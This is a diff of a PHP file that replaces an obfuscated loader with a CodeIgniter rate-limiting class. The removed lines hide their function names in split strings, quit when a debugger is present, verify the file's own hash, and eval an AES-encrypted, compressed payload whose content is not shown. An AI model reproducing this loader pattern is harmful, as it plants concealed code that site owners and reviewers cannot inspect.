@@ -1,28 +1,118 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_u6ukaaco=('bas'.'e64'.'_de'.'cod'.'e');
-$_reg06s5q=('gzu'.'nco'.'mpr'.'ess');
-$_ssui4p6i=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_bwbzvc8l='phYniB2l1PY=';
-$_whwn0m9q='zrR+hdsY';
-$_bcx20ov7='5obXmLYb';
-$_gcqnxdbj='Jglxcc3E';
-$_qgsfjxv3='wYKvY/na';
-$_thb4433x='n6W3rpZ4';
-$_r7ifp9aw='5qB25Q==';
-$_jsuy3l8s='rjG8tbss';
-$_eivh4i4j=$_u6ukaaco($_qgsfjxv3.$_gcqnxdbj.$_whwn0m9q.$_bcx20ov7.$_bwbzvc8l);
-$_j4enbu7p=$_u6ukaaco($_jsuy3l8s.$_thb4433x.$_r7ifp9aw);
-$_iwsyu0dq=$_u6ukaaco('dHJ5kZtxpk7sgU/e/+XI3+X6OkhnEu3EugSpqJU+PrLdSukWD+n/rFg9xJZSMcU1x0WT/jCNrxPIcM1dUVqCWbzrRQvuWFLJY+QWkE1MHgPJ7qW0XuZy8tZGkIeKOqP9fC3YKMZuYWksxMX8zfJHUw4E4I1L6EEeUMrogOirw05wKkmV1Ku9XuIfHEwsyoP2DAqvJGTuOJMJIeGjdBf29kq9oIfwmylGIn50rbW40jiqEhVKaHIqGag4GiIggfFrN4u7tV8wnl1hi6MOqaX9Le9a0t2e/4yMqNscLlyJuz0GZ/VopWRDsPIqZn+ZiDs3Mibqa8mdddOj5JInedAaY6O/W+Uw0h+FItHJOY8NVIbXcwNW+BOtTO3bHpUEXbqMiQTgTX94RBPFDke0skSgX0jClQhGtHxUSaJSn6oDlis/XlX2dbmJDlSaYvmjbrW8clqlbqjavB7vnFI3UpRRmuBzdM7vVe8/3SO9dr+prPyKKphTJkwIymh5jD+QAxCGGXyPcUzygLDbXQrr3gEfLMOc9Tf0H1Oaaai4cQ7dCSCN7q+mXZZIlWqvTL1Lpq6U12Gca/tqKytmiW39+pguNmKXMNSkgW7AkKFeHT/d5XVbTmqb3kDoIDQF8o2jtuiTqWPjty5G+7pt6Aml0+9Q7l/6Yav/1vExZyucOCmZuztiaBt3UwRzOTj78ur0HrbXU+4+E17lcNaU1VrZeoxpS1q3agF80pG4ciRLzp5OG/2VQalBImLwnLRMbM+3OWqIMCKhV4Lo6XVnF+Ht3pmYpD7eg/8jEsYlRjBJxoFiAl+HqhGRmhImf7rkWt6O95ZINVHl9Bh1npTjjr+oYc5mJ65ymHsuJuUDzERKr6pdIWdNGBiEJOWesrxlHI/d8vAAWTq6IWRQSBd2uhRmQTT+3oY24TaNMT3eXltqrbuPbpThGTldkdWJM7M/5Fzxj+lWPWeez2SghRvTW5cXmI9HF1UzJ8W9bhVAEw/MEE3+AZFlSgwpp4TgqzHXxz09VNGMAiuDhql9PzS8kZ9EzSv9oWIvs8wkNaqHAGXUdskbBOh043j6jT6DOQihlYxlcPPGatLr9+jfbuPVfUVioIPrKUdWG2VKob6Sb3avKMYbRRDEepzPG60fgJoxZbDae3Bx/E/9lhXmUPVfxDU8SYLZm242mFEIjPwdpB2/nn0F/GH/E+l/HBGoVH9fiFzvJm8opdCfD2S5akV5oTPyXCeo7w==');
-$_zglb18ii=$_ssui4p6i($_iwsyu0dq,'aes-256-cbc',$_eivh4i4j,OPENSSL_RAW_DATA,$_j4enbu7p);
-if($_zglb18ii===false){exit;}
-$_z6nc5euw=$_reg06s5q($_zglb18ii);
-if($_z6nc5euw===false){exit;}
-$_lol3iq62='47e1af7bf436ecdc41d3a61fafa06745f7e49e563e0090c106001ca476a62f3f';
-$_fw6a9o0h=@file_get_contents(__FILE__);
-if($_fw6a9o0h!==false){
-$_y0qajlmc=str_replace($_lol3iq62,"0000000000000000000000000000000000000000000000000000000000000000",$_fw6a9o0h);
-$_l9gulyg6=hash("sha256",$_y0qajlmc);
-if($_l9gulyg6!==$_lol3iq62){@http_response_code(403);exit;}
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+class Ratelimit
+{
+const COOKIE = 'ac_dev';
+private $CI;
+
+private $device;
+public function __construct()
+{
+$this->CI =& get_instance();
 }
-eval($_z6nc5euw);
+
+private function limit($scope)
+{
+$l = $this->CI->config->item('rl_' . $scope);
+if (!is_array($l) || count($l) < 2) {
+return array(30, 900, NULL, NULL);
+}
+return array((int) $l[0], (int) $l[1], isset($l[2]) ? (int) $l[2] : NULL, isset($l[3]) ? (int) $l[3] : NULL);
+}
+
+/** IP dùng để đếm: IPv4 giữ nguyên, IPv6 gộp theo /64 (một người dùng thường có cả dải /64 để xoay vòng). */
+public static function ip_bucket($ip)
+{
+$bin = @inet_pton((string) $ip);
+if ($bin === FALSE || strlen($bin) !== 16) {
+return (string) $ip;
+}
+return inet_ntop(substr($bin, 0, 8) . str_repeat("\0", 8)) . '/64';
+}
+
+private function ip()
+{
+return self::ip_bucket(client_ip());
+}
+
+public function device()
+{
+if ($this->device !== NULL) {
+return $this->device;
+}
+$v = isset($_COOKIE[self::COOKIE]) ? (string) $_COOKIE[self::COOKIE] : '';
+if (!preg_match('/^[a-f0-9]{32}$/', $v)) {
+$v = bin2hex(random_bytes(16));
+if (!headers_sent() && !is_cli()) {
+setcookie(self::COOKIE, $v, array(
+'expires' => time() + 365 * 86400,
+'path' => (string) ($this->CI->config->item('cookie_path') ?: '/'),
+'secure' => (bool) $this->CI->config->item('cookie_secure'),
+'httponly' => TRUE,
+'samesite' => 'Lax',
+));
+}
+$_COOKIE[self::COOKIE] = $v;
+}
+return $this->device = $v;
+}
+private function count_since($scope, $col, $val, $since)
+{
+$q = @$this->CI->db->query('SELECT COUNT(*) AS n FROM rate_events WHERE scope = ? AND ' . ($col === 'device' ? 'device' : 'ip') . ' = ? AND created_at > ?',
+array($scope, $val, $since));
+return $q ? (int) $q->row()->n : 0;
+}
+
+public function allowed($scope)
+{
+list($max, $window, $max_ip, $max_all) = $this->limit($scope);
+$since = time() - $window;
+if ($max_all !== NULL && $this->count_all_since($scope, $since) >= $max_all) {
+return FALSE;
+}
+if ($max_ip === NULL) {
+return $this->count_since($scope, 'ip', $this->ip(), $since) < $max;
+}
+return $this->count_since($scope, 'device', $this->device(), $since) < $max
+&& $this->count_since($scope, 'ip', $this->ip(), $since) < $max_ip;
+}
+
+private function count_all_since($scope, $since)
+{
+$q = @$this->CI->db->query('SELECT COUNT(*) AS n FROM rate_events WHERE scope = ? AND created_at > ?', array($scope, $since));
+return $q ? (int) $q->row()->n : 0;
+}
+public function hit($scope)
+{
+list(, , $max_ip) = $this->limit($scope);
+@$this->CI->db->insert('rate_events', array(
+'scope' => $scope,
+'ip' => $this->ip(),
+'device' => $max_ip === NULL ? '' : $this->device(),
+'created_at' => time(),
+));
+
+if (mt_rand(1, 100) === 1) {
+@$this->CI->db->query('DELETE FROM rate_events WHERE created_at < ?', array(time() - 86400));
+}
+}
+
+public function clear($scope)
+{
+list(, , $max_ip) = $this->limit($scope);
+$where = $max_ip === NULL ? array('scope' => $scope, 'ip' => $this->ip()) : array('scope' => $scope, 'device' => $this->device());
+@$this->CI->db->delete('rate_events', $where);
+}
+}
